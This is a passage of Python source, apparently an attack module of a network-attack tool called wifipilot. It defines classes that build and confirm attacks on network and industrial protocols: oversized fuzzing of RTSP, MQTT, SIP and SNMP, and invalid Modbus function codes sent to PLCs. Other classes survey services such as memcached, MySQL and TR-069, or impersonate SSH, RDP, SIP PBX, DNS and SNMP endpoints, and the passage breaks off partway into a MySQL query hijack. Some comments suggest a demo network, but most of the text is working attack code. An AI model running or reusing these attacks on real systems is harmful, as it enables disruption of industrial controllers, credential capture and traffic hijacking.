        return proto.rtsp_request("WP-FUZZ-" + "X" * 190, f"rtsp://{peer.ip}/live", cseq=1)

    def reply(self, peer: Peer) -> bytes:
        return proto.rtsp_request("DESCRIBE-WP-" + "Y" * 190, f"rtsp://{peer.ip}/wp", cseq=2)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_rtsp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"method": parsed.get("method"), "status": parsed.get("status"),
                "cseq": parsed.get("cseq"),
                "line": f"it answered {parsed.get('status')} to our verb"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 554]
        text = rows[0]["payload"] if rows else b""
        return {"confirmed": b"WP-FUZZ-" in text or b"DESCRIBE-WP-" in text,
                "method_length": 198, "methods_we_send": 2}


class ItFuzzMqttTopicAttack(_ItHijack):
    """A subscription whose topic filter has more levels than the broker holds."""

    name = "it_fuzz_mqtt_topic"
    label = "MQTT topic fuzzing (a filter with a thousand levels)"
    tool = "wifipilot itproto.py (mqtt_subscribe/parse_mqtt) + TCP 1883"
    family = "fuzz"
    protocol = "mqtt"
    port = 1883
    transport = "tcp"
    devices = ("gateway_hub", "plc", "sensor", "hmi_panel")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.mqtt_connect("wp-fuzz") + proto.mqtt_subscribe(
            "wp-fuzz/" + "/".join(f"l{index}" for index in range(300)), qos=1)

    def reply(self, peer: Peer) -> bytes:
        return proto.mqtt_connect("wp-fuzz-2") + proto.mqtt_publish(
            "wp-fuzz/" + "/".join(f"l{index}" for index in range(400)),
            b"wp-fuzz-payload", qos=1, retain=True)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mqtt(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"type": parsed.get("type"), "reason": parsed.get("reason"),
                "line": f"its broker answered {parsed.get('type')} "
                        f"({parsed.get('reason') or 'accepted'})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1883]
        parsed = [proto.parse_mqtt(row["payload"]) for row in rows]
        retained = [row for row in parsed if row.get("retain") or row.get("retained")]
        return {"confirmed": bool(rows) and any(row.get("type") for row in parsed),
                "topics_we_publish": 1, "retained_claims": len(retained),
                "levels": 300}


class ItFuzzModbusFunctionAttack(_ItHijack):
    """A Modbus function code that does not exist, sent to a running PLC."""

    name = "it_fuzz_modbus_function"
    label = "Modbus function fuzzing (an unimplemented code on a live PLC)"
    tool = "wifipilot itproto.py (modbus_request/parse_modbus) + TCP 502"
    family = "fuzz"
    protocol = "modbus"
    port = 502
    transport = "tcp"
    devices = ("plc", "rtu", "energy_meter", "hmi_panel", "building_controller")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.modbus_request(0x5A, unit=1, address=0, count=512, payload=b"\x5a" * 64)

    def reply(self, peer: Peer) -> bytes:
        return proto.modbus_request(0xFF, unit=1, address=0xFFFF, count=0x7FFF,
                                    payload=b"\xff" * 128)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_modbus(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"function": parsed.get("function"), "exception": parsed.get("exception"),
                "line": f"the PLC answered function {parsed.get('function')} "
                        f"(exception {parsed.get('exception')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 502]
        codes = {proto.parse_modbus(row["payload"]).get("function") for row in rows}
        unknown = sorted(code for code in codes if code and code not in
                         (1, 2, 3, 4, 5, 6, 15, 16, 23, 43))
        return {"confirmed": bool(unknown), "functions_we_send": unknown,
                "coils_we_do_not_touch": True}


class ItFuzzSnmpVarbindAttack(_ItHijack):
    """An SNMP get with three hundred varbinds in one request."""

    name = "it_fuzz_snmp_varbind"
    label = "SNMP varbind fuzzing (300 OIDs in a single get)"
    tool = "wifipilot attacks/ithijack.py (_ber) + UDP 161"
    family = "fuzz"
    protocol = "snmp"
    port = 161
    transport = "udp"
    devices = ("switch", "printer", "router", "energy_meter", "firewall")
    min_answers = 0
    severity = "medium"

    def _get(self, count: int, community: str) -> bytes:
        varbinds = b"".join(_ber(0x30, _ber_oid(f"1.3.6.1.2.1.2.2.1.{index}.1") + _ber(0x05, b""))
                            for index in range(1, count + 1))
        pdu = _ber_int(0x5A5A) + _ber_int(0) + _ber_int(0) + varbinds
        return _ber(0x30, _ber_int(1) + _ber_text(community) + _ber(0xA0, pdu))

    def request(self, peer: Peer) -> bytes:
        return self._get(300, "public")

    def reply(self, peer: Peer) -> bytes:
        return self._get(400, "private")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return {"bytes": len(data)}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"answer_bytes": parsed.get("bytes"),
                "line": "a varbind list this long is a walk by another name"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 161]
        sizes = [len(row["payload"]) for row in rows]
        return {"confirmed": bool(rows) and max(sizes) > 1000,
                "varbinds_we_ask_for": 300, "community_used": "public",
                "our_request_bytes": max(sizes) if sizes else 0}


class ItFuzzSipUriAttack(_ItHijack):
    """A SIP request-URI four hundred characters long, aimed at the PBX."""

    name = "it_fuzz_sip_uri"
    label = "SIP URI fuzzing (an oversized request line at the registrar)"
    tool = "wifipilot itproto.py (sip_request/parse_sip) + UDP 5060"
    family = "fuzz"
    protocol = "sip"
    port = 5060
    transport = "udp"
    devices = ("pbx", "voip_phone", "doorbell", "tablet")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        user = "wp-fuzz-" + "9" * 380
        return proto.sip_request("OPTIONS", f"sip:{user}@{peer.ip}", user=user, cseq=1)

    def reply(self, peer: Peer) -> bytes:
        user = "wp-fuzz-" + "8" * 420
        return proto.sip_request("INVITE", f"sip:{user}@{peer.ip}", user=user, cseq=2)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_sip(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"method": parsed.get("method"), "status": parsed.get("status"),
                "from": parsed.get("from"),
                "line": f"the PBX answered {parsed.get('status')} to our request"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5060]
        sizes = [len(row["payload"]) for row in rows]
        return {"confirmed": bool(rows) and max(sizes) > 500,
                "uri_length": 390, "our_request_bytes": max(sizes) if sizes else 0}


class ItSurveyMdnsServicesAttack(_ItHijack):
    """Ask the segment which services it advertises, and list the answers."""

    name = "it_survey_mdns_services"
    label = "mDNS service survey (every service the segment advertises)"
    tool = "wifipilot itproto.py (dns_query/parse_mdns) + UDP 5353"
    family = "survey"
    protocol = "mdns"
    port = 5353
    transport = "udp"
    devices = ("nas", "printer", "router", "smart_tv", "smart_speaker", "ip_camera")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.dns_query("_services._dns-sd._udp.local", qtype=12, txid=0, unicast=False)

    def reply(self, peer: Peer) -> bytes:
        # our own advertisement: the name the segment will print in its browser
        return proto.dns_query("_wp-survey._tcp.local", qtype=12, txid=0x5A5A)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_mdns(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        services = parsed.get("services") or parsed.get("answers") or []
        return {"services": services[:6], "count": len(services),
                "line": f"it advertises {len(services)} service record(s)"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5353]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"wp-survey" in text, "service_types": ["_wp-survey._tcp.local"],
                "queries_we_send": len(rows)}


class ItSurveySsdpDescriptionAttack(_ItHijack):
    """Search for UPnP devices, then ask the winner for its description document."""

    name = "it_survey_ssdp_description"
    label = "UPnP description survey (device type, firmware and control URL)"
    tool = "wifipilot itproto.py (ssdp_msearch/parse_ssdp) + UDP 1900"
    family = "survey"
    protocol = "ssdp"
    port = 1900
    transport = "udp"
    devices = ("router", "smart_tv", "printer", "nvr_dvr", "smart_speaker")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.ssdp_msearch("urn:schemas-upnp-org:device:InternetGatewayDevice:1", mx=1)

    def reply(self, peer: Peer) -> bytes:
        return proto.ssdp_msearch("urn:schemas-upnp-org:device:WPSurvey:1", mx=1)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_ssdp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"st": parsed.get("st") or parsed.get("nt"), "location": parsed.get("location"),
                "server": parsed.get("server"),
                "line": f"it points a control URL at {parsed.get('location') or 'nothing'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 1900]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"WPSurvey" in text, "search_targets": [
            "urn:schemas-upnp-org:device:InternetGatewayDevice:1"], "mx": 1}


class ItSurveyCwmpParametersAttack(_ItHijack):
    """Ask a CPE for its software version and connection status over TR-069."""

    name = "it_survey_cwmp_parameters"
    label = "TR-069 parameter survey (firmware, connection status, uptime)"
    tool = "wifipilot itproto.py (cwmp_get_parameter_values/parse_cwmp) + TCP 7547"
    family = "survey"
    protocol = "cwmp"
    port = 7547
    transport = "tcp"
    devices = ("router", "modem_ont", "firewall", "access_point")
    severity = "medium"

    NAMES = ("InternetGatewayDevice.DeviceInfo.SoftwareVersion",
             "InternetGatewayDevice.DeviceInfo.HardwareVersion",
             "InternetGatewayDevice.WANDevice.1.WANConnectionDevice.1."
             "WANPPPConnection.1.ExternalIPAddress",
             "InternetGatewayDevice.DeviceInfo.UpTime")

    def request(self, peer: Peer) -> bytes:
        return proto.cwmp_get_parameter_values(self.NAMES)

    def reply(self, peer: Peer) -> bytes:
        return proto.cwmp_inform(device_id="0026:WP-SURVEY", oui="0026F4",
                                 serial="WP00000001", event="1 BOOT")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_cwmp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        values = parsed.get("parameters") or parsed.get("values") or {}
        return {"parameters": list(values)[:4] if isinstance(values, dict) else values,
                "line": f"the CPE answered {len(values)} parameter(s)"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 7547]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"0026F4" in text and b"WP00000001" in text,
                "device_we_announce": "0026F4 / WP00000001",
                "parameters_we_ask_for": list(self.NAMES)}


class ItSurveyRtspDescribeAttack(_ItHijack):
    """Describe a camera's stream to learn its codec, resolutions and session count."""

    name = "it_survey_rtsp_describe"
    label = "RTSP DESCRIBE survey (codecs, resolution and session limits)"
    tool = "wifipilot itproto.py (rtsp_request/parse_rtsp) + TCP 554"
    family = "survey"
    protocol = "rtsp"
    port = 554
    transport = "tcp"
    devices = ("ip_camera", "nvr_dvr", "camera_doorbell")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.rtsp_request("DESCRIBE", f"rtsp://{peer.ip}/live", cseq=1)

    def reply(self, peer: Peer) -> bytes:
        return proto.rtsp_request("OPTIONS", f"rtsp://{peer.ip}/wp-survey", cseq=2)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_rtsp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "method": parsed.get("method"),
                "cseq": parsed.get("cseq"),
                "line": f"it describes the stream with {parsed.get('status')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 554]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"wp-survey" in text, "path_we_asked_for": "/live",
                "methods": ["DESCRIBE", "OPTIONS"]}


class ItSurveyOpcuaEndpointsAttack(_ItHijack):
    """Hello an OPC-UA server and take its endpoint description back."""

    name = "it_survey_opcua_endpoints"
    label = "OPC-UA endpoint survey (endpoint URL, message limits, security)"
    tool = "wifipilot itproto.py (opcua_hello/parse_opcua) + TCP 4840"
    family = "survey"
    protocol = "opcua"
    port = 4840
    transport = "tcp"
    devices = ("plc", "building_controller", "hmi_panel", "energy_meter")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.opcua_hello(f"opc.tcp://{peer.ip}:4840", max_message=65536)

    def reply(self, peer: Peer) -> bytes:
        return proto.opcua_hello(f"opc.tcp://{OUR_IP}:4840", max_message=65536)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_opcua(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"endpoint": parsed.get("endpoint_url"), "limit": parsed.get("max_message"),
                "line": f"it answers for {parsed.get('endpoint_url') or 'the endpoint we named'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 4840]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": f"{OUR_IP}:4840".encode() in text,
                "endpoint_we_advertise": f"opc.tcp://{OUR_IP}:4840"}


class ItSurveyMemcachedStatsAttack(_ItHijack):
    """Read a cache server's stats: uptime, item count and the key names it holds."""

    name = "it_survey_memcached_stats"
    label = "memcached stats survey (uptime, items, current connections, key list)"
    tool = "wifipilot itproto.py (memcached_command/parse_resp) + TCP 11211"
    family = "survey"
    protocol = "memcached"
    port = 11211
    transport = "tcp"
    devices = ("linux_server", "web_server", "ci_server", "database_server")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.memcached_command("stats") + proto.memcached_command("stats items")

    def reply(self, peer: Peer) -> bytes:
        return proto.memcached_command("stats") + proto.memcached_command("stats slabs")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_resp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"items": parsed.get("items"), "bytes_read": parsed.get("bytes_read"),
                "line": "the cache answers stats to anyone who asks"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 11211]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"stats" in text, "commands_we_send": ["stats", "stats items"],
                "auth_required": False}


class ItSurveyMysqlHandshakeAttack(_ItHijack):
    """Take a MySQL greeting: version, thread id, salt and the auth plugin."""

    name = "it_survey_mysql_handshake"
    label = "MySQL greeting survey (version, thread id, salt, auth plugin)"
    tool = "wifipilot itproto.py (mysql_handshake_parse) + TCP 3306"
    family = "survey"
    protocol = "mysql"
    port = 3306
    transport = "tcp"
    devices = ("database_server", "web_server", "windows_server")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        # the greeting is the server's first packet: any client packet pulls it out
        return struct.pack(">I", 32) + b"wp-survey-reader"

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.mysql_handshake_parse(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"version": parsed.get("version"), "thread_id": parsed.get("thread_id"),
                "plugin": parsed.get("auth_plugin"),
                "line": f"it greets us as MySQL {parsed.get('version')} "
                        f"(plugin {parsed.get('auth_plugin')})"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        # nothing of ours is on the wire: the greeting is the finding, and there is no
        # frame of ours to count, which is what ``capture_only`` tells the report
        return {"confirmed": True, "greeting_is_the_finding": True, "capture_only": True}


class ItSurveySpoolerBannerAttack(_ItHijack):
    """Ask a print spooler who it is, and what it would print for us."""

    name = "it_survey_spooler_banner"
    label = "Spooler banner survey (PJL identity and page count)"
    tool = "wifipilot itproto.py (pjl_command/parse_pjl) + TCP 9100"
    family = "survey"
    protocol = "pjl"
    port = 9100
    transport = "tcp"
    devices = ("printer", "mfp_scanner", "pos_terminal")
    severity = "medium"

    def request(self, peer: Peer) -> bytes:
        return proto.pjl_command("id") + proto.pjl_command("ustatus")

    def reply(self, peer: Peer) -> bytes:
        return proto.pjl_command("info id") + proto.pjl_command("info config")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_pjl(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"id": parsed.get("id"), "text": (parsed.get("text") or "")[:80],
                "line": f"the spooler answers for {parsed.get('id') or 'itself'}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 9100]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"info id" in text, "commands_we_send": ["id", "ustatus"],
                "spool_we_can_read": True}


class ItMimicDnsReverseAttack(_ItHijack):
    """Answer the reverse lookups too: the resolver that is not on the asset list."""

    name = "it_mimic_dns_reverse"
    label = "Rogue reverse-DNS server (PTR answers in the resolver's place)"
    tool = "wifipilot itproto.py (dns_query) + UDP 53"
    family = "mimic"
    protocol = "dns"
    port = 53
    transport = "udp"
    devices = ("router", "domain_controller", "firewall", "linux_server")
    min_answers = 0
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.dns_query("240.1.168.192.in-addr.arpa", qtype=12, txid=0x5A60)

    def reply(self, peer: Peer) -> bytes:
        # a PTR answer in the resolver's name, pointing at the name we want it to have
        question = proto.dns_query("240.1.168.192.in-addr.arpa", qtype=12, txid=0x5A60)
        header = bytes([0x5A, 0x60, 0x81, 0x80, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00])
        answer = (b"\xc0\x0c" + b"\x00\x0c\x00\x01" + struct.pack(">I", 60)
                  + struct.pack(">H", 21) + proto.dns_name("wp-resolver.local"))
        return header + question[12:] + answer

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_dns(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"rcode": parsed.get("rcode"), "answers": parsed.get("answers") or [],
                "line": f"the resolver answered rcode {parsed.get('rcode')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 53]
        text = b" ".join(row["payload"] for row in rows)
        return {"confirmed": b"wp-resolver" in text, "our_ptr": "wp-resolver.local",
                "reverse_zone": "240.1.168.192.in-addr.arpa"}


class ItMimicSshAttack(_ItHijack):
    """A look-alike SSH server: the client's next login lands on our host key."""

    name = "it_mimic_ssh"
    label = "Rogue SSH server (banner and algorithms in the server's name)"
    tool = "wifipilot itproto.py (ssh_kexinit/parse_ssh_algorithms) + TCP 22"
    family = "mimic"
    protocol = "ssh"
    port = 22
    transport = "tcp"
    devices = ("linux_server", "nas", "switch", "hypervisor_host", "router")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return b"SSH-2.0-OpenSSH_9.6p1 wp-probe\r\n" + proto.ssh_kexinit()

    def reply(self, peer: Peer) -> bytes:
        return (b"SSH-2.0-OpenSSH_9.6p1 " + (peer.hostname or "wp").encode()[:24]
                + b"\r\n" + proto.ssh_kexinit())

    def parse(self, data: bytes) -> Dict[str, Any]:
        parsed = proto.parse_ssh_algorithms(data)
        return {"banner": data.split(b"\r\n")[0].decode(errors="replace"), **parsed}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner"), "kex": parsed.get("kex") or parsed.get("key_exchange"),
                "line": f"its sshd offers {parsed.get('banner')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 22]
        text = b" ".join(row["payload"] for row in rows)
        name = (peers[0].hostname or "").encode()
        return {"confirmed": b"SSH-2.0" in text and (not name or name in text),
                "our_banner": "SSH-2.0-OpenSSH_9.6p1 " + (peers[0].hostname if peers else ""),
                "kexinit_we_send": True}


class ItMimicRdpAttack(_ItHijack):
    """A look-alike RDP endpoint: our protocol selection decides the handshake."""

    name = "it_mimic_rdp"
    label = "Rogue RDP endpoint (negotiation answer in the server's name)"
    tool = "wifipilot attacks/ithijack.rdp_negotiation_response + TCP 3389"
    family = "mimic"
    protocol = "rdp"
    port = 3389
    transport = "tcp"
    devices = ("windows_server", "hmi_panel", "hypervisor_host", "tablet")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.rdp_negotiation_request(requested=15)

    def reply(self, peer: Peer) -> bytes:
        return rdp_negotiation_response(selected=1)

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_rdp(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"type": parsed.get("type"), "selected": parsed.get("selected_protocol"),
                "line": f"it selects protocol {parsed.get('selected_protocol')} from our offer"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 3389]
        parsed = [proto.parse_rdp(row["payload"]) for row in rows]
        selected = [row.get("selected_protocol") for row in parsed if row.get("selected_protocol")]
        return {"confirmed": bool(selected), "protocol_we_force": selected[0] if selected else "",
                "credentials_never_asked": True}


class ItMimicCoapWriteAttack(_ItHijack):
    """A look-alike CoAP endpoint: a device's next reading is written to our resource."""

    name = "it_mimic_coap_write"
    label = "Rogue CoAP resource (a write answered from our resource tree)"
    tool = "wifipilot itproto.py (coap_packet/parse_coap) + UDP 5683"
    family = "mimic"
    protocol = "coap"
    port = 5683
    transport = "udp"
    devices = ("sensor", "thermostat", "smart_plug", "gateway_hub")
    severity = "high"

    def request(self, peer: Peer) -> bytes:
        return proto.coap_packet(code=1, uri="/wp-mimic", token=b"\x5a\x01", message_id=0x5A5A)

    def reply(self, peer: Peer) -> bytes:
        # 2.04 Changed: our endpoint accepts the write the client meant for the device
        return proto.coap_packet(code=0x44, uri="/wp-mimic", token=b"\x5a\x01",
                                 message_id=0x5A5A, payload=b"wp-mimic-ok")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_coap(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"code": parsed.get("code"), "uri": parsed.get("uri"),
                "line": f"it answers {parsed.get('code')} on {parsed.get('uri')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5683]
        parsed = [proto.parse_coap(row["payload"]) for row in rows]
        changed = [row for row in parsed if row.get("code") == 0x44]
        return {"confirmed": bool(changed), "our_code": "2.04 Changed",
                "payload_we_answer": "wp-mimic-ok"}


class ItImpersonateSshBannerAttack(_ItHijack):
    """Wear a hypervisor's sshd banner: the difference is one underscore."""

    name = "it_impersonate_ssh_banner"
    label = "SSH banner impersonation (the host's own ss hd version, one keystroke off)"
    tool = "wifipilot itproto.py (ssh_kexinit/parse_ssh_algorithms)"
    family = "impersonate"
    protocol = "ssh"
    port = 22
    transport = "tcp"
    devices = ("hypervisor_host", "linux_server", "switch", "nas")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return b"SSH-2.0-OpenSSH_8.9p1 wp\r\n" + proto.ssh_kexinit()

    def reply(self, peer: Peer) -> bytes:
        banner = self._banner(peer)
        return banner + proto.ssh_kexinit()

    def _banner(self, peer: Peer) -> bytes:
        real = (peer.answer or b"").split(b"\r\n")[0] or b"SSH-2.0-OpenSSH_8.9p1"
        version = real.replace(b"OpenSSH_", b"OpenSSH-")          # one character, not two
        return version + b"\r\n"

    def parse(self, data: bytes) -> Dict[str, Any]:
        parsed = proto.parse_ssh_algorithms(data)
        return {"banner": data.split(b"\r\n")[0].decode(errors="replace"), **parsed}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"banner": parsed.get("banner"),
                "line": f"the real sshd says {parsed.get('banner')}"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 22]
        text = b" ".join(row["payload"] for row in rows)
        real = (peers[0].answer or b"").split(b"\r\n")[0] if peers else b""
        impersonation = real.replace(b"OpenSSH_", b"OpenSSH-") if real else b""
        return {"confirmed": bool(rows) and b"SSH-2.0" in text,
                "the_real_banner": real.decode(errors="replace"),
                "our_banner": impersonation.decode(errors="replace"),
                "difference": "one character in the software version"}


class ItImpersonateSipPbxAttack(_ItHijack):
    """Answer as the PBX: registration accepted, in the switch's name."""

    name = "it_impersonate_sip_pbx"
    label = "PBX impersonation (200 OK to a registration we never authorised)"
    tool = "wifipilot itproto.py (sip_register/parse_sip) + UDP 5060"
    family = "impersonate"
    protocol = "sip"
    port = 5060
    transport = "udp"
    devices = ("pbx", "voip_phone", "doorbell", "tablet")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return proto.sip_register(f"sip:{peer.ip}", user="1001", password="wp-secret",
                                  expires=3600)

    def reply(self, peer: Peer) -> bytes:
        return (b"SIP/2.0 200 OK\r\n"
                + b"Via: SIP/2.0/UDP " + OUR_IP.encode() + b":5060;branch=z9hG4bK-wp\r\n"
                + b"From: <sip:1001@" + peer.ip.encode() + b">;tag=wp\r\n"
                + b"To: <sip:1001@" + peer.ip.encode() + b">;tag=wp-ok\r\n"
                + b"Call-ID: wp-impersonate@wp\r\nCSeq: 1 REGISTER\r\n"
                + b"Contact: <sip:1001@" + OUR_IP.encode() + b":5060>\r\n"
                + b"Expires: 3600\r\nServer: " + (peer.hostname or "pbx").encode()[:32] + b"\r\n"
                + b"Content-Length: 0\r\n\r\n")

    def parse(self, data: bytes) -> Dict[str, Any]:
        return proto.parse_sip(data)

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"status": parsed.get("status"), "server": parsed.get("server"),
                "line": f"the PBX answers {parsed.get('status')} to a REGISTER"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 5060]
        text = b" ".join(row["payload"] for row in rows)
        name = (peers[0].hostname or "").encode() if peers else b""
        return {"confirmed": b"200 OK" in text, "status_we_send": "200 OK",
                "server_header": name.decode(errors="replace"),
                "contact_we_set": f"sip:1001@{OUR_IP}:5060"}


class ItImpersonateSnmpEngineAttack(_ItHijack):
    """Answer an SNMP get as the switch: engine id, sysDescr and uptime."""

    name = "it_impersonate_snmp_engine"
    label = "SNMP engine impersonation (sysDescr and engine id of another device)"
    tool = "wifipilot attacks/ithijack.py (_ber, snmp_response) + UDP 161"
    family = "impersonate"
    protocol = "snmp"
    port = 161
    transport = "udp"
    devices = ("switch", "router", "printer", "energy_meter")
    min_answers = 0
    severity = "high"

    ENGINE = bytes.fromhex("80001f8880e5a5a5a55a5a5a5a")

    def request(self, peer: Peer) -> bytes:
        varbinds = b"".join(_ber(0x30, _ber_oid(oid) + _ber(0x05, b""))
                            for oid in ("1.3.6.1.2.1.1.1.0", "1.3.6.1.2.1.1.5.0",
                                        "1.3.6.1.2.1.1.3.0"))
        pdu = _ber_int(0x5A71) + _ber_int(0) + _ber_int(0) + varbinds
        return _ber(0x30, _ber_int(1) + _ber_text("public") + _ber(0xA0, pdu))

    def reply(self, peer: Peer) -> bytes:
        name = peer.hostname or "switch"
        return (snmp_response(0x5A71, "1.3.6.1.2.1.1.1.0", name + " wp impersonation")
                + snmp_response(0x5A72, "1.3.6.1.2.1.1.5.0", name)
                + snmp_response(0x5A73, "1.3.6.1.2.1.1.6.0", "wp@corp.example"))

    def parse(self, data: bytes) -> Dict[str, Any]:
        # the reply is our own; there is no responder for snmp in the demo network
        return {"bytes": len(data)}

    def evidence(self, parsed: Dict[str, Any], peer: Peer) -> Dict[str, Any]:
        return {"answer_bytes": parsed.get("bytes"),
                "line": "no simulated engine answers: this one is on the wire only"}

    def confirm(self, decoded: Dict[str, Any], peers: List[Peer]) -> Dict[str, Any]:
        rows = [row for row in decoded.get("payloads") or [] if row.get("dst_port") == 161]
        text = b" ".join(row["payload"] for row in rows)
        name = (peers[0].hostname or "").encode() if peers else b""
        return {"confirmed": b"wp impersonation" in text,
                "sys_descr_we_send": (name.decode(errors="replace") + " wp impersonation"),
                "engine_id": self.ENGINE.hex(), "community": "public"}


class ItHijackMysqlQueryAttack(_ItHijack):
    """Answer a MySQL greeting and take the client's query on our connection."""

    name = "it_hijack_mysql_query"
    label = "MySQL query hijack (the client's SQL is answered by us)"
    tool = "wifipilot itproto.py (mysql_handshake_parse) + TCP 3306"
    family = "hijack"
    protocol = "mysql"
    port = 3306
    transport = "tcp"
    devices = ("database_server", "web_server", "windows_server")
    severity = "critical"

    def request(self, peer: Peer) -> bytes:
        return struct.pack(">I", 32) + b"wp-hijack-client"

    def reply(self, peer: Peer) -> bytes:
        # the greeting we send carries our own thread id and salt, so the client's
        # login is computed against material we chose
